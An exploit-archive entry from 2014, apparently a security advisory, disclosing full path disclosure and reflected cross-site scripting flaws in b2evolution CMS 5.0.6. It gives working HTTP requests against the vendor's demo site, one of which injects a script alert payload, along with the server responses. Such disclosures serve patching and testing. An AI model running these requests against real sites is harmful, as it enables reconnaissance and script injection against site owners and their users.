@@ -1,0 +1,96 @@
+id: 21815
+date: 01/26/2014
+title: b2evolution CMS 5.0.6 - XSS & FPD Vulnerabilities
+author: Smash_
+cves: 
+
+#Title: b2evolution CMS 5.0.6 - XSS & FPD
+#Version: 5.0.6 (Latest ATM)
+#Vendor: b2evolution.net - en.wikipedia.org/wiki/B2evolution
+#Demo: demo3.b2evolution.net
+#Date: 01.25.2014
+#Contact: smash[at]devilteam.pl
+
+1. Full Path Disclosure 
+
+A) Paged
+
+Request:
+demo3.b2evolution.net/stable/blog1.php?paged[]= OR demo3.b2evolution.net/stable/blog1.php?paged=[]
+
+Response:
+Warning: Cannot modify header information - headers already sent by (output started at /home/b2evodemo/www/stable/inc/_core/model/_pagecache.class.php:506) in /home/b2evodemo/www/stable/inc/_core/_misc.funcs.php on line 5480
+
+b) Login
+
+Request:
+POST /stable/blog1.php?disp=login&redirect_to=%2Fstable%2Fblog1.php%2Fwelcome-to-b2evolution%3Fdisp%3Dsingle%26title%3Dwelcome-to-b2evolution%26more%3D1%26c%3D1%26tb%3D1%26pb%3D1&source=menu%20link HTTP/1.1
+Host: demo3.b2evolution.net
+
+x[]=&q[]=
+
+Response:
+Notice: Array to string conversion in /home/b2evodemo/www/stable/inc/_init_login.inc.php on line 112
+(...)
+Warning: Cannot modify header information - headers already sent by (output started at /home/b2evodemo/www/stable/inc/_init_login.inc.php:112) in /home/b2evodemo/www/stable/inc/_core/_template.funcs.php on line 59
+
+
+c) Display 
+
+Request:
+demo3.b2evolution.net/stable/blog1.php?disp[]=comments
+
+Response:
+Warning: preg_match() expects parameter 2 to be string, array given in /home/b2evodemo/www/stable/inc/_core/_param.funcs.php on line 298
+
+d) Page
+
+Request:
+demo3.b2evolution.net/stable/blog1.php/this-is-a-multipage-post?page[]=
+
+Response:
+Warning: Cannot modify header information - headers already sent by (output started at /home/b2evodemo/www/stable/inc/_core/model/_pagecache.class.php:506) in /home/b2evodemo/www/stable/inc/_core/_misc.funcs.php on line 5480
+
+e) Redirect_to
+
+Request:
+demo3.b2evolution.net/stable/blog4.php?disp=msgform&recipient_id=4&redirect_to[]=http%3A%2F%2Fdemo3.b2evolution.net%2Fstable%2Fblog4.php%3Fdisp%3Dmsgform%26recipient_id%3D4
+
+Response:
+Warning: Cannot modify header information - headers already sent by (output started at /home/b2evodemo/www/stable/inc/_core/model/_pagecache.class.php:506) in /home/b2evodemo/www/stable/inc/_core/_misc.funcs.php on line 2404
+
+f) Recipient_id
+
+Request:
+demo3.b2evolution.net/stable/blog4.php?disp=msgform&recipient_id[]=4&redirect_to=http%3A%2F%2Fdemo3.b2evolution.net%2Fstable%2Fblog4.php%3Fdisp%3Dmsgform%26recipient_id%3D4
+
+Response:
+Warning: Cannot modify header information - headers already sent by (output started at /home/b2evodemo/www/stable/inc/_core/model/_pagecache.class.php:506) in /home/b2evodemo/www/stable/inc/_core/_misc.funcs.php on line 5480
+
+
+
+2. Cross Site Scripting
+
+a) POST - params_form_title_start & params_form_title_end
+
+Request:
+POST /stable/htsrv/anon_async.php HTTP/1.1
+Host: demo3.b2evolution.net
+
+action=get_comment_form&p=44&blog=2&disp=single&params%5BItem%5D=null&params%5Bdisp_comments%5D=true&params%5Bdisp_comment_form%5D=true&params%5Bdisp_trackbacks%5D=false&params%5Bdisp_trackback_url%5D=false&params%5Bdisp_pingbacks%5D=true&params%5Bdisp_section_title%5D=true&params%5Bdisp_rating_summary%5D=true&params%5Bbefore_section_title%5D=%3Ch3+class%3D%22feedback_section%22%3E&params%5Bafter_section_title%5D=%3C%2Fh3%3E&params%5Bcomments_title_text%5D=&params%5Bcomment_list_start%5D=%0A%0A&params%5Bcomment_list_end%5D=%0A%0A&params%5Bcomment_start%5D=%3Cdiv+class%3D%22bComment%22%3E&params%5Bcomment_end%5D=%3C%2Fdiv%3E&params%5Bpreview_start%5D=%3Cdiv+class%3D%22bComment%22+id%3D%22comment_preview%22%3E&params%5Bpreview_end%5D=%3C%2Fdiv%3E&params%5Bcomment_error_start%5D=%3Cdiv+class%3D%22bComment%22+id%3D%22comment_error%22%3E&params%5Bcomment_error_end%5D=%3C%2Fdiv%3E&params%5Bcomment_template%5D=_item_comment.inc.php&params%5Blink_to%5D=userurl%3Euserpage&params%5Bform_title_start%5D=<script>alert(666)</script>params%5Bform_title_end%5D=%3C%2Fh3%3E&params%5Bdisp_notification%5D=true&params%5Bnotification_before%5D=%3Cdiv+class%3D%22comment_notification%22%3E&params%5Bnotification_text%5D=This+is+your+post.+You+are+receiving+notifications+when+anyone+comments+on+your+posts.&params%5Bnotification_text2%5D=You+will+be+notified+by+email+when+someone+comments+here.&params%5Bnotification_text3%5D=Notify+me+by+email+when+someone+comments+here.&params%5Bnotification_after%5D=%3C%2Fdiv%3E&params%5Bfeed_title%5D=%23
+
+Response:
+HTTP/1.1 200 OK
+Date: Sat, 25 Jan 2014 12:55:03 GMT
+Server: Apache
+Expires: Sat, 25 Jan 2014 12:55:03 +0000
+Last-Modified: Sat, 25 Jan 2014 12:55:03 +0000
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 3025
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<a id="form_p44"></a><script>alert(666)</script>params[form_title_end]=</h3>Leave a comment</h3>
+
+#  0day.today [2023-03-21]  #
